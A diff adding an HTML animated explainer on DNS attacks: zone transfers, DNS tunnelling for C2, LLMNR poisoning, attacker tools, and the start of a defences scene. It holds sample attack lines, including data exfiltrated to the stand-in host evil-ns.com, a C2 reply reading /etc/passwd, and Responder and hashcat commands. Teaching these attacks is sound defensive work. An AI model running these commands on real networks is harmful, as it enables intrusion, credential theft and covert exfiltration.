@@ -1,0 +1,690 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>DNS as an Attack Surface</title>
+<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&display=swap" rel="stylesheet">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{background:#0a0a0f;font-family:'Press Start 2P',monospace;width:100%;height:100vh;overflow:hidden;display:flex;flex-direction:column;align-items:center;color:#fff}
+#app{width:390px;height:100vh;position:relative;overflow:hidden}
+.scene{position:absolute;inset:0;width:390px;height:100vh;display:flex;flex-direction:column;transform:translateX(100%);transition:transform .35s cubic-bezier(.4,0,.2,1);pointer-events:none}
+.scene.active{transform:translateX(0);pointer-events:auto}
+.hdr{height:90px;flex-shrink:0;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:8px;padding:0 14px;border-bottom:1px solid #2a1f3d}
+.hdr-title{font-size:13px;color:#4ec9e1;text-align:center;letter-spacing:.5px;line-height:1.5}
+.hdr-sub{font-size:9px;color:#666;text-align:center;letter-spacing:1px;line-height:1.5}
+.dots{display:flex;gap:8px}
+.dot{width:11px;height:11px;border-radius:50%;background:#2a1f3d;transition:background .2s}
+.dot.active{background:#4ec9e1}.dot.done{background:#4eff9a}
+.slr{height:28px;flex-shrink:0;display:flex;align-items:center;justify-content:space-between;padding:0 14px}
+.slabel{font-size:9px;letter-spacing:1px}
+.sbadge{font-size:7px;padding:3px 8px;border:1px solid currentColor;border-radius:2px}
+.anim{flex:1;overflow-y:auto;overflow-x:hidden;scrollbar-width:none;-ms-overflow-style:none;min-height:0}
+.anim::-webkit-scrollbar{display:none}
+.info{height:110px;flex-shrink:0;margin:0 12px;border:2px solid #4ec9e1;padding:10px 14px;display:flex;flex-direction:column;justify-content:center;gap:7px;font-size:9px;line-height:1.9}
+.info.am{border-color:#e8a020}.info.rd{border-color:#e85050}.info.gn{border-color:#4eff9a}.info.pu{border-color:#a080ff}
+.il{color:#ccc}.ih{color:#4eff9a}.ih.am{color:#e8a020}.ih.rd{color:#e85050}.ih.pu{color:#a080ff}
+.srow{height:70px;flex-shrink:0;display:flex;gap:8px;padding:8px 12px}
+.sc{flex:1;background:#130d1e;border:1px solid #2a1f3d;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:4px}
+.sv{font-size:13px;color:#4ec9e1;text-align:center}
+.sv.am{color:#e8a020}.sv.gn{color:#4eff9a}.sv.rd{color:#e85050}.sv.pu{color:#a080ff}
+.sl{font-size:7px;color:#777;text-align:center;line-height:1.4}
+.ctrl{height:60px;flex-shrink:0;display:flex;align-items:center;justify-content:center;gap:10px;padding:0 12px}
+.btn{font-family:'Press Start 2P',monospace;font-size:9px;padding:8px 12px;border:2px solid #4ec9e1;background:transparent;color:#4ec9e1;cursor:pointer;transition:all .15s}
+.btn:hover{background:#4ec9e130}.btn:active{transform:scale(.97)}
+.btn.play{border-color:#4eff9a;color:#4eff9a}.btn.play:hover{background:#4eff9a20}
+.btn:disabled{opacity:.3;cursor:default}
+.panel{opacity:0;transition:opacity .4s;border-radius:2px;padding:9px 10px}
+.panel.vis{opacity:1}
+.tline{opacity:0;transition:opacity .3s}
+.tline.vis{opacity:1}
+@keyframes scanline{0%{transform:translateY(-100%)}100%{transform:translateY(400%)}}
+@keyframes cursor{0%,100%{opacity:1}50%{opacity:0}}
+</style>
+</head>
+<body>
+<div id="app">
+
+<!-- ══════════════════════════════════════
+     SCENE 1 — HOOK: AXFR ZONE TRANSFER
+══════════════════════════════════════ -->
+<div class="scene active" id="s1" style="background:#0a0008">
+  <div class="hdr" style="background:#0a0008;border-bottom:1px solid #2d0018">
+    <div class="hdr-title" style="color:#e85050">DNS — ATTACK SURFACE</div>
+    <div class="hdr-sub">ZONE TRANSFERS · TUNNELING · LLMNR</div>
+    <div class="dots">
+      <div class="dot active"></div><div class="dot"></div><div class="dot"></div>
+      <div class="dot"></div><div class="dot"></div>
+    </div>
+  </div>
+  <div class="slr" style="background:#0a0008">
+    <span class="slabel" style="color:#e85050">HOOK</span>
+    <span class="sbadge" style="color:#e85050;border-color:#e85050">ONE COMMAND</span>
+  </div>
+  <div class="anim" style="background:#0a0008">
+    <div style="padding:10px 12px 14px;display:flex;flex-direction:column;gap:10px">
+
+      <!-- Hook quote -->
+      <div id="hook_quote" class="panel" style="background:#100005;border:2px solid #e85050;padding:12px 14px">
+        <div style="font-size:7px;color:#e85050;margin-bottom:8px">⚡ WHY IT MATTERS</div>
+        <div style="font-size:8px;color:#fff;line-height:2.1">"One dig command against a misconfigured DNS server can reveal your <span style="color:#e85050">entire internal infrastructure</span>"</div>
+      </div>
+
+      <!-- Terminal: dig AXFR -->
+      <div style="background:#050002;border:2px solid #2d0018;border-radius:3px;overflow:hidden">
+        <div style="background:#120008;padding:5px 10px;display:flex;align-items:center;gap:6px">
+          <div style="width:7px;height:7px;border-radius:50%;background:#e85050"></div>
+          <div style="width:7px;height:7px;border-radius:50%;background:#e8a020"></div>
+          <div style="width:7px;height:7px;border-radius:50%;background:#4eff9a"></div>
+          <div style="flex:1;text-align:center;font-size:6.5px;color:#555">terminal</div>
+        </div>
+        <div style="padding:10px 12px;font-size:6.5px;line-height:2.2">
+          <div style="color:#888">$ <span style="color:#4ec9e1">dig</span> axfr <span style="color:#e8a020">@ns1.target.corp</span> <span style="color:#aaa">target.corp</span></div>
+          <div id="axfr_hdr" class="tline" style="color:#555;margin-top:4px">; &lt;&lt;&gt;&gt; DiG 9.18 &lt;&lt;&gt;&gt; axfr target.corp</div>
+          <div id="axfr_ok"  class="tline" style="color:#4eff9a">; Transfer allowed — dumping zone...</div>
+
+          <!-- Zone records streaming in -->
+          <div id="axfr_r1" class="tline" style="color:#aaa;margin-top:2px">target.corp.&nbsp;&nbsp;&nbsp;&nbsp;SOA&nbsp;&nbsp;&nbsp;ns1.target.corp.</div>
+          <div id="axfr_r2" class="tline" style="display:flex;gap:6px;align-items:center">
+            <span style="color:#ff4040">dc01</span><span style="color:#555">.target.corp.</span>
+            <span style="color:#aaa">A</span><span style="color:#4eff9a">10.0.0.10</span>
+            <span style="font-size:5.5px;padding:1px 5px;background:#2a0010;border:1px solid #e85050;color:#e85050">DOMAIN CTRL</span>
+          </div>
+          <div id="axfr_r3" class="tline" style="display:flex;gap:6px;align-items:center">
+            <span style="color:#ff4040">vpn</span><span style="color:#555">.target.corp.</span>
+            <span style="color:#aaa">A</span><span style="color:#4eff9a">10.0.0.22</span>
+            <span style="font-size:5.5px;padding:1px 5px;background:#2a0010;border:1px solid #e85050;color:#e85050">VPN GW</span>
+          </div>
+          <div id="axfr_r4" class="tline" style="display:flex;gap:6px;align-items:center">
+            <span style="color:#ff4040">db-prod</span><span style="color:#555">.target.corp.</span>
+            <span style="color:#aaa">A</span><span style="color:#4eff9a">10.0.1.50</span>
+            <span style="font-size:5.5px;padding:1px 5px;background:#2a0010;border:1px solid #e85050;color:#e85050">PROD DB</span>
+          </div>
+          <div id="axfr_r5" class="tline" style="display:flex;gap:6px;align-items:center">
+            <span style="color:#ff4040">dev-api</span><span style="color:#555">.target.corp.</span>
+            <span style="color:#aaa">A</span><span style="color:#4eff9a">10.0.2.11</span>
+            <span style="font-size:5.5px;padding:1px 5px;background:#2a0810;border:1px solid #e8a020;color:#e8a020">DEV SRV</span>
+          </div>
+          <div id="axfr_r6" class="tline" style="display:flex;gap:6px;align-items:center">
+            <span style="color:#ff4040">mgmt</span><span style="color:#555">.target.corp.</span>
+            <span style="color:#aaa">A</span><span style="color:#4eff9a">10.0.0.5</span>
+            <span style="font-size:5.5px;padding:1px 5px;background:#2a0010;border:1px solid #e85050;color:#e85050">MGMT</span>
+          </div>
+          <div id="axfr_r7" class="tline" style="display:flex;gap:6px;align-items:center">
+            <span style="color:#ff4040">backup</span><span style="color:#555">.target.corp.</span>
+            <span style="color:#aaa">A</span><span style="color:#4eff9a">10.0.3.80</span>
+            <span style="font-size:5.5px;padding:1px 5px;background:#2a0010;border:1px solid #e85050;color:#e85050">BACKUP</span>
+          </div>
+          <div id="axfr_end" class="tline" style="color:#e85050;font-size:7px;margin-top:4px">✓ Zone transfer complete — 47 records exposed</div>
+        </div>
+      </div>
+
+      <!-- What happened card -->
+      <div id="axfr_why" class="panel" style="background:#100005;border:1px solid #2d0018;display:flex;gap:10px;align-items:center">
+        <div style="font-size:22px;flex-shrink:0">🗺️</div>
+        <div>
+          <div style="font-size:7.5px;color:#e85050;margin-bottom:5px">FULL RECON IN ONE COMMAND</div>
+          <div style="font-size:6.5px;color:#aaa;line-height:1.9">AXFR replicates entire DNS zones to secondary nameservers. Misconfigured = any IP can request it. Tool: <span style="color:#4ec9e1">dnsrecon -d target.corp -t axfr</span></div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+  <div class="info rd">
+    <div class="il">AXFR = zone transfer. No IP restriction = full map.</div>
+    <div class="ih rd">Every hostname, IP, and service exposed in seconds.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv rd">AXFR</div><div class="sl">ZONE DUMP</div></div>
+    <div class="sc"><div class="sv rd">47</div><div class="sl">RECORDS OUT</div></div>
+    <div class="sc"><div class="sv am">30s</div><div class="sl">FULL RECON</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" disabled>◀ PREV</button>
+    <button class="btn play" onclick="play(1)">▶ PLAY</button>
+    <button class="btn" onclick="go(2)">NEXT ▶</button>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     SCENE 2 — DNS TUNNELING / C2
+══════════════════════════════════════ -->
+<div class="scene" id="s2" style="background:#000a18">
+  <div class="hdr" style="background:#000a18;border-bottom:1px solid #0d2030">
+    <div class="hdr-title" style="color:#4ec9e1">DNS TUNNELING</div>
+    <div class="hdr-sub">C2 OVER QUERIES — FIREWALLS PASS IT</div>
+    <div class="dots">
+      <div class="dot done"></div><div class="dot active"></div><div class="dot"></div>
+      <div class="dot"></div><div class="dot"></div>
+    </div>
+  </div>
+  <div class="slr" style="background:#000a18">
+    <span class="slabel" style="color:#e8a020">EXFIL / C2</span>
+    <span class="sbadge" style="color:#e85050;border-color:#e85050">COVERT</span>
+  </div>
+  <div class="anim" style="background:#000a18">
+    <div style="padding:10px 12px 14px;display:flex;flex-direction:column;gap:9px">
+
+      <!-- Tunnel flow diagram SVG -->
+      <div style="background:#000610;border:2px solid #0d2030;border-radius:3px;overflow:hidden">
+        <svg width="100%" height="200" viewBox="0 0 366 200" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <filter id="gtun"><feGaussianBlur stdDeviation="2" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+          </defs>
+
+          <!-- VICTIM box -->
+          <rect id="tn_victim" x="8" y="50" width="80" height="100" fill="#060e18" stroke="#0d2030" stroke-width="1.5" rx="2" opacity="0"/>
+          <text id="tn_vt1" x="48" y="78" text-anchor="middle" font-size="7" fill="#4ec9e1" font-family="'Press Start 2P',monospace" opacity="0">VICTIM</text>
+          <text id="tn_vt2" x="48" y="92" text-anchor="middle" font-size="6" fill="#555" font-family="'Press Start 2P',monospace" opacity="0">MACHINE</text>
+          <text id="tn_emoji" x="48" y="128" text-anchor="middle" font-size="22" opacity="0">💻</text>
+
+          <!-- FIREWALL bar -->
+          <rect id="tn_fw" x="114" y="40" width="20" height="120" fill="#0a0820" stroke="#e8a020" stroke-width="1.5" rx="1" opacity="0"/>
+          <text id="tn_fwt" x="124" y="105" text-anchor="middle" font-size="5.5" fill="#e8a020" font-family="'Press Start 2P',monospace" opacity="0" transform="rotate(-90,124,105)">FIREWALL</text>
+          <!-- green checkmark on fw -->
+          <text id="tn_fw_ok" x="124" y="170" text-anchor="middle" font-size="8" fill="#4eff9a" opacity="0">✓</text>
+          <text id="tn_fw_ok2" x="124" y="182" text-anchor="middle" font-size="5" fill="#4eff9a" font-family="'Press Start 2P',monospace" opacity="0">DNS OK</text>
+
+          <!-- DNS Resolver -->
+          <rect id="tn_res" x="158" y="50" width="70" height="100" fill="#060e18" stroke="#4ec9e1" stroke-width="1.5" rx="2" opacity="0"/>
+          <text id="tn_rest1" x="193" y="80" text-anchor="middle" font-size="6" fill="#4ec9e1" font-family="'Press Start 2P',monospace" opacity="0">PUBLIC</text>
+          <text id="tn_rest2" x="193" y="93" text-anchor="middle" font-size="6" fill="#4ec9e1" font-family="'Press Start 2P',monospace" opacity="0">DNS</text>
+          <text id="tn_rest3" x="193" y="128" text-anchor="middle" font-size="18" opacity="0">🌐</text>
+
+          <!-- Attacker NS -->
+          <rect id="tn_atk" x="268" y="50" width="90" height="100" fill="#0a0005" stroke="#e85050" stroke-width="1.5" rx="2" opacity="0"/>
+          <text id="tn_atkt1" x="313" y="78" text-anchor="middle" font-size="6.5" fill="#e85050" font-family="'Press Start 2P',monospace" opacity="0">ATTACKER</text>
+          <text id="tn_atkt2" x="313" y="92" text-anchor="middle" font-size="6" fill="#555" font-family="'Press Start 2P',monospace" opacity="0">NS SERVER</text>
+          <text id="tn_atkt3" x="313" y="125" text-anchor="middle" font-size="20" opacity="0">🎯</text>
+
+          <!-- DATA packet label over firewall arrow -->
+          <text id="tn_q1" x="75" y="44" text-anchor="middle" font-size="5.5" fill="#e85050" font-family="'Press Start 2P',monospace" opacity="0">data→b64</text>
+          <text id="tn_q2" x="75" y="36" text-anchor="middle" font-size="5" fill="#555" font-family="'Press Start 2P',monospace" opacity="0">c3VwZXJzZWNyZXQ=</text>
+          <text id="tn_q3" x="75" y="28" text-anchor="middle" font-size="4.5" fill="#4ec9e1" font-family="'Press Start 2P',monospace" opacity="0">.evil.ns.com TXT?</text>
+
+          <!-- Arrow: victim → fw -->
+          <line id="tn_l1" x1="88" y1="100" x2="112" y2="100" stroke="#0d2030" stroke-width="2" opacity="0"/>
+          <polygon id="tn_a1" points="116,100 108,96 108,104" fill="#0d2030" opacity="0"/>
+          <circle id="tn_p1" cx="88" cy="100" r="4" fill="#e85050" opacity="0" filter="url(#gtun)"/>
+
+          <!-- Arrow: fw → resolver -->
+          <line id="tn_l2" x1="136" y1="100" x2="156" y2="100" stroke="#0d2030" stroke-width="2" opacity="0"/>
+          <polygon id="tn_a2" points="160,100 152,96 152,104" fill="#0d2030" opacity="0"/>
+          <circle id="tn_p2" cx="136" cy="100" r="4" fill="#4eff9a" opacity="0" filter="url(#gtun)"/>
+
+          <!-- Arrow: resolver → attacker NS -->
+          <line id="tn_l3" x1="228" y1="100" x2="266" y2="100" stroke="#0d2030" stroke-width="2" opacity="0"/>
+          <polygon id="tn_a3" points="270,100 262,96 262,104" fill="#0d2030" opacity="0"/>
+          <circle id="tn_p3" cx="228" cy="100" r="4" fill="#e85050" opacity="0" filter="url(#gtun)"/>
+
+          <!-- Response back label -->
+          <text id="tn_resp" x="247" y="145" text-anchor="middle" font-size="5.5" fill="#4eff9a" font-family="'Press Start 2P',monospace" opacity="0">C2 CMD in TXT reply</text>
+        </svg>
+      </div>
+
+      <!-- Encoded query example -->
+      <div id="tn_query_card" class="panel" style="background:#000610;border:2px solid #e85050">
+        <div style="font-size:7px;color:#e85050;margin-bottom:7px">ACTUAL DNS QUERY (dnscat2)</div>
+        <div style="background:#020408;padding:8px;font-size:6px;line-height:2.3;border:1px solid #0d2030;word-break:break-all">
+          <div style="color:#888">Query:</div>
+          <div style="color:#e85050">c3VwZXJzZWNyZXRkYXRh<span style="color:#555">.</span><span style="color:#4ec9e1">c2.evil-ns.com</span></div>
+          <div style="color:#888;margin-top:4px">Decoded:</div>
+          <div style="color:#4eff9a">supersecretdata → attacker C2</div>
+          <div style="color:#e8a020;margin-top:4px">← TXT reply: "aWQgJiYgY2F0IC9ldGMvcGFzc3dk"</div>
+          <div style="color:#4eff9a">Decoded: id &amp;&amp; cat /etc/passwd</div>
+        </div>
+      </div>
+
+      <!-- Tool + why it works -->
+      <div id="tn_why" class="panel" style="background:#000610;border:1px solid #0d2030;display:flex;gap:10px;align-items:flex-start;padding:10px">
+        <div style="font-size:20px;flex-shrink:0">🔒</div>
+        <div>
+          <div style="font-size:7px;color:#4ec9e1;margin-bottom:5px">WHY FIREWALLS MISS IT</div>
+          <div style="font-size:6.5px;color:#aaa;line-height:1.9">Port 53 UDP is universally allowed. Content inspection on DNS is rare. Tool: <span style="color:#e85050">dnscat2</span> — full shell over DNS. Detection: abnormally long subdomain labels, high query rate to single NS.</div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+  <div class="info rd">
+    <div class="il">Data encoded in subdomain labels, sent as DNS queries.</div>
+    <div class="ih rd">Firewalls allow :53. Full C2 shell invisible to most tools.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv rd">:53</div><div class="sl">ALWAYS OPEN</div></div>
+    <div class="sc"><div class="sv am">B64</div><div class="sl">ENCODED</div></div>
+    <div class="sc"><div class="sv rd">C2</div><div class="sl">FULL SHELL</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" onclick="go(1)">◀ PREV</button>
+    <button class="btn play" onclick="play(2)">▶ PLAY</button>
+    <button class="btn" onclick="go(3)">NEXT ▶</button>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     SCENE 3 — LLMNR POISONING
+══════════════════════════════════════ -->
+<div class="scene" id="s3" style="background:#100800">
+  <div class="hdr" style="background:#100800;border-bottom:1px solid #281800">
+    <div class="hdr-title" style="color:#e8a020">LLMNR POISONING</div>
+    <div class="hdr-sub">WINDOWS BROADCAST → NTLMV2 HASH CAPTURE</div>
+    <div class="dots">
+      <div class="dot done"></div><div class="dot done"></div><div class="dot active"></div>
+      <div class="dot"></div><div class="dot"></div>
+    </div>
+  </div>
+  <div class="slr" style="background:#100800">
+    <span class="slabel" style="color:#e8a020">LAN ATTACK</span>
+    <span class="sbadge" style="color:#e85050;border-color:#e85050">CREDS</span>
+  </div>
+  <div class="anim" style="background:#100800">
+    <div style="padding:10px 12px 14px;display:flex;flex-direction:column;gap:9px">
+
+      <!-- LLMNR flow SVG -->
+      <div style="background:#080500;border:2px solid #281800;border-radius:3px;overflow:hidden">
+        <svg width="100%" height="195" viewBox="0 0 366 195" xmlns="http://www.w3.org/2000/svg">
+          <defs>
+            <filter id="gll"><feGaussianBlur stdDeviation="2" result="b"/><feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
+          </defs>
+
+          <!-- Windows PC -->
+          <text x="55" y="52" text-anchor="middle" font-size="24">🖥️</text>
+          <text x="55" y="68" text-anchor="middle" font-size="6" fill="#aaa" font-family="'Press Start 2P',monospace">WINDOWS</text>
+          <text x="55" y="80" text-anchor="middle" font-size="6" fill="#555" font-family="'Press Start 2P',monospace">victim</text>
+
+          <!-- Broadcast ring -->
+          <circle id="ll_ring1" cx="55" cy="55" r="0" fill="none" stroke="#e8a020" stroke-width="1.5" opacity="0"/>
+          <circle id="ll_ring2" cx="55" cy="55" r="0" fill="none" stroke="#e8a020" stroke-width="1" opacity="0"/>
+
+          <!-- Broadcast label -->
+          <text id="ll_bcast" x="183" y="24" text-anchor="middle" font-size="6.5" fill="#e8a020" font-family="'Press Start 2P',monospace" opacity="0">📢 WHO IS "fileserver"?</text>
+          <text id="ll_bcast2" x="183" y="36" text-anchor="middle" font-size="5.5" fill="#555" font-family="'Press Start 2P',monospace" opacity="0">multicast to all LAN hosts</text>
+
+          <!-- Real DNS / no answer -->
+          <rect id="ll_dns" x="150" y="50" width="66" height="50" fill="#080500" stroke="#281800" stroke-width="1.5" rx="2" opacity="0"/>
+          <text id="ll_dns_t" x="183" y="72" text-anchor="middle" font-size="6" fill="#555" font-family="'Press Start 2P',monospace" opacity="0">DNS</text>
+          <text id="ll_dns_nx" x="183" y="88" text-anchor="middle" font-size="6" fill="#e85050" font-family="'Press Start 2P',monospace" opacity="0">NXDOMAIN</text>
+
+          <!-- Attacker -->
+          <text id="ll_atk_e" x="313" y="52" text-anchor="middle" font-size="24" opacity="0">🕵️</text>
+          <text id="ll_atk_t" x="313" y="68" text-anchor="middle" font-size="6" fill="#e85050" font-family="'Press Start 2P',monospace" opacity="0">ATTACKER</text>
+          <text id="ll_atk_t2" x="313" y="80" text-anchor="middle" font-size="5.5" fill="#555" font-family="'Press Start 2P',monospace" opacity="0">responder</text>
+
+          <!-- Attacker reply arrow -->
+          <line id="ll_reply" x1="290" y1="100" x2="78" y2="100" stroke="#0d2838" stroke-width="2" opacity="0"/>
+          <polygon id="ll_repl_a" points="74,100 82,96 82,104" fill="#0d2838" opacity="0"/>
+          <text id="ll_repl_t" x="183" y="95" text-anchor="middle" font-size="6" fill="#e85050" font-family="'Press Start 2P',monospace" opacity="0">"I AM fileserver" → (lie)</text>
+          <circle id="ll_pkt" cx="290" cy="100" r="5" fill="#e85050" opacity="0" filter="url(#gll)"/>
+
+          <!-- Auth attempt -->
+          <line id="ll_auth" x1="78" y1="128" x2="290" y2="128" stroke="#0d2838" stroke-width="2" opacity="0"/>
+          <polygon id="ll_auth_a" points="294,128 286,124 286,132" fill="#0d2838" opacity="0"/>
+          <text id="ll_auth_t" x="183" y="122" text-anchor="middle" font-size="5.5" fill="#4ec9e1" font-family="'Press Start 2P',monospace" opacity="0">NTLMv2 auth attempt →</text>
+          <circle id="ll_pkt2" cx="78" cy="128" r="5" fill="#4ec9e1" opacity="0" filter="url(#gll)"/>
+
+          <!-- Hash captured badge -->
+          <rect id="ll_hash_bg" x="230" y="140" width="128" height="50" fill="#1a0010" rx="2" opacity="0"/>
+          <text id="ll_hash_t1" x="294" y="158" text-anchor="middle" font-size="6" fill="#e85050" font-family="'Press Start 2P',monospace" opacity="0">HASH CAPTURED</text>
+          <text id="ll_hash_t2" x="294" y="172" text-anchor="middle" font-size="5.5" fill="#aaa" font-family="'Press Start 2P',monospace" opacity="0">ALICE::CORP:ab34...</text>
+          <text id="ll_hash_t3" x="294" y="184" text-anchor="middle" font-size="5" fill="#e8a020" font-family="'Press Start 2P',monospace" opacity="0">→ crack offline / relay</text>
+        </svg>
+      </div>
+
+      <!-- Responder output -->
+      <div id="ll_resp_card" class="panel" style="background:#080500;border:2px solid #e8a020">
+        <div style="font-size:7px;color:#e8a020;margin-bottom:7px">RESPONDER OUTPUT</div>
+        <div style="background:#040200;padding:8px;font-size:6.5px;line-height:2.2;border:1px solid #180e00">
+          <div><span style="color:#4eff9a">[*]</span> <span style="color:#aaa">LLMNR Poisoner started</span></div>
+          <div><span style="color:#4eff9a">[+]</span> <span style="color:#aaa">Poisoned answer sent to</span> <span style="color:#4ec9e1">10.0.0.45</span></div>
+          <div><span style="color:#e85050">[!]</span> <span style="color:#aaa">NTLMv2-SSP Hash captured:</span></div>
+          <div style="color:#e85050;word-break:break-all">ALICE::CORP:ab34ff92:84bc...<span style="color:#555">:0101...</span></div>
+          <div style="color:#e8a020;margin-top:4px">→ hashcat -m 5600 hash.txt rockyou.txt</div>
+        </div>
+      </div>
+
+    </div>
+  </div>
+  <div class="info am">
+    <div class="il">Windows asks LAN "who is X?" if DNS fails.</div>
+    <div class="ih am">Attacker answers, gets NTLMv2 hash → crack or relay.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv am">LLMNR</div><div class="sl">BROADCAST</div></div>
+    <div class="sc"><div class="sv rd">NTLMv2</div><div class="sl">HASH OUT</div></div>
+    <div class="sc"><div class="sv am">GPO</div><div class="sl">FIX = OFF</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" onclick="go(2)">◀ PREV</button>
+    <button class="btn play" onclick="play(3)">▶ PLAY</button>
+    <button class="btn" onclick="go(4)">NEXT ▶</button>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     SCENE 4 — TOOLS
+══════════════════════════════════════ -->
+<div class="scene" id="s4" style="background:#001018">
+  <div class="hdr" style="background:#001018;border-bottom:1px solid #0d2030">
+    <div class="hdr-title" style="color:#4ec9e1">ATTACKER TOOLKIT</div>
+    <div class="hdr-sub">DNSRECON · GOBUSTER · RESPONDER · DNSCAT2</div>
+    <div class="dots">
+      <div class="dot done"></div><div class="dot done"></div><div class="dot done"></div>
+      <div class="dot active"></div><div class="dot"></div>
+    </div>
+  </div>
+  <div class="slr" style="background:#001018">
+    <span class="slabel" style="color:#4ec9e1">TOOLS</span>
+    <span class="sbadge" style="color:#e85050;border-color:#e85050">RECON+EXPLOIT</span>
+  </div>
+  <div class="anim" style="background:#001018">
+    <div style="padding:10px 12px 14px;display:flex;flex-direction:column;gap:8px">
+
+      <!-- dnsrecon -->
+      <div id="tk_t1" class="panel" style="background:#000a10;border:2px solid #e85050">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:7px">
+          <div style="font-size:9px;color:#e85050">dnsrecon</div>
+          <div style="font-size:6px;padding:2px 7px;border:1px solid #e85050;color:#e85050">ZONE TRANSFER</div>
+        </div>
+        <div style="background:#020608;padding:7px;font-size:6px;color:#4eff9a;line-height:2.1;border:1px solid #0a1820">dnsrecon -d target.corp -t axfr</div>
+        <div style="font-size:6.5px;color:#888;margin-top:6px;line-height:1.8">Attempts AXFR against all NS records. Also brute-forces subdomains, checks zone walking, MX/SPF enum.</div>
+      </div>
+
+      <!-- gobuster dns -->
+      <div id="tk_t2" class="panel" style="background:#000a10;border:2px solid #e8a020">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:7px">
+          <div style="font-size:9px;color:#e8a020">gobuster dns</div>
+          <div style="font-size:6px;padding:2px 7px;border:1px solid #e8a020;color:#e8a020">SUBDOMAIN BRUTE</div>
+        </div>
+        <div style="background:#020608;padding:7px;font-size:6px;color:#4eff9a;line-height:2.1;border:1px solid #0a1820">gobuster dns -d target.corp -w subdomains.txt</div>
+        <div style="font-size:6.5px;color:#888;margin-top:6px;line-height:1.8">Bruteforces DNS subdomains when AXFR is blocked. Discovers hidden services not in public DNS.</div>
+      </div>
+
+      <!-- responder -->
+      <div id="tk_t3" class="panel" style="background:#000a10;border:2px solid #a080ff">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:7px">
+          <div style="font-size:9px;color:#a080ff">Responder</div>
+          <div style="font-size:6px;padding:2px 7px;border:1px solid #a080ff;color:#a080ff">LLMNR POISON</div>
+        </div>
+        <div style="background:#020608;padding:7px;font-size:6px;color:#4eff9a;line-height:2.1;border:1px solid #0a1820">python3 Responder.py -I eth0 -wv</div>
+        <div style="font-size:6.5px;color:#888;margin-top:6px;line-height:1.8">Poisons LLMNR/NBT-NS on LAN. Captures NTLMv2 hashes passively. Hashes → hashcat or ntlmrelayx.</div>
+      </div>
+
+      <!-- dnscat2 -->
+      <div id="tk_t4" class="panel" style="background:#000a10;border:2px solid #4ec9e1">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:7px">
+          <div style="font-size:9px;color:#4ec9e1">dnscat2</div>
+          <div style="font-size:6px;padding:2px 7px;border:1px solid #4ec9e1;color:#4ec9e1">TUNNEL / C2</div>
+        </div>
+        <div style="background:#020608;padding:7px;font-size:6px;color:#4eff9a;line-height:2.1;border:1px solid #0a1820">dnscat2-server evil-ns.com  # server side</div>
+        <div style="font-size:6.5px;color:#888;margin-top:6px;line-height:1.8">Encrypted C2 channel over DNS TXT/CNAME queries. Shell, file transfer, port forwarding — all via port 53.</div>
+      </div>
+
+    </div>
+  </div>
+  <div class="info" style="border-color:#4ec9e1">
+    <div class="il">Four tools cover the full DNS attack chain.</div>
+    <div class="ih">Recon → brute → poison → tunnel → owned.</div>
+  </div>
+  <div class="srow">
+    <div class="sc"><div class="sv rd">AXFR</div><div class="sl">DNSRECON</div></div>
+    <div class="sc"><div class="sv am">LLMNR</div><div class="sl">RESPONDER</div></div>
+    <div class="sc"><div class="sv" style="color:#4ec9e1">C2</div><div class="sl">DNSCAT2</div></div>
+  </div>
+  <div class="ctrl">
+    <button class="btn" onclick="go(3)">◀ PREV</button>
+    <button class="btn play" onclick="play(4)">▶ PLAY</button>
+    <button class="btn" onclick="go(5)">NEXT ▶</button>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     SCENE 5 — FIXES / DEFENCES
+══════════════════════════════════════ -->
+<div class="scene" id="s5" style="background:#001a08">
+  <div class="hdr" style="background:#001a08;border-bottom:1px solid #0d3018">
+    <div class="hdr-title" style="color:#4eff9a">DEFENCES</div>
+    <div class="hdr-sub">RESTRICT · BLOCK · DISABLE · MONITOR</div>
+    <div class="dots">
+      <div class="dot done"></div><div class="dot done"></div><div class="dot done"></div>
+      <div class="dot done"></div><div class="dot active"></div>
+    </div>
+  </div>
+  <div class="slr" style="background:#001a08">
+    <span class="slabel" style="color:#4eff9a">FIXES</span>
+    <span class="sbadge" style="color:#4eff9a;border-color:#4eff9a">HARDEN NOW</span>
+  </div>
+  <div class="anim" style="background:#001a08">
+    <div style="padding:10px 12px 14px;display:flex;flex-direction:column;gap:8px">
+
+      <!-- Fix AXFR -->
+      <div id="fx_1" class="panel" style="background:#000d04;border-left:4px solid #e85050;border-top:1px solid #1a2810;border-right:1px solid #1a2810;border-bottom:1px solid #1a2810;padding:10px 12px">
+        <div style="display:flex;align-items:center;gap:8px;margin-bottom:6px">
+          <span style="font-size:14px">🔐</span>
+          <span style="font-size:7.5px;color:#e85050">FIX AXFR — ZONE TRANSFER</span>
+        </div>
+        <div style="background:#020a04;padding:7px;font-size:6px;color:#4eff9a;line-height:2.0;border:1px solid #0a1808;margin-bottom:6px">
+          <div><span style="color:#555"># BIND9 named.conf</span></div>
+          <div>allow-transfer { <span style="color:#4ec9e1">secondary-ns-ip</span>; };</div>
+          <div>also-notify { <span style="color:#4ec9e1">secondary-ns-ip</span>; };</div>
+        </div>
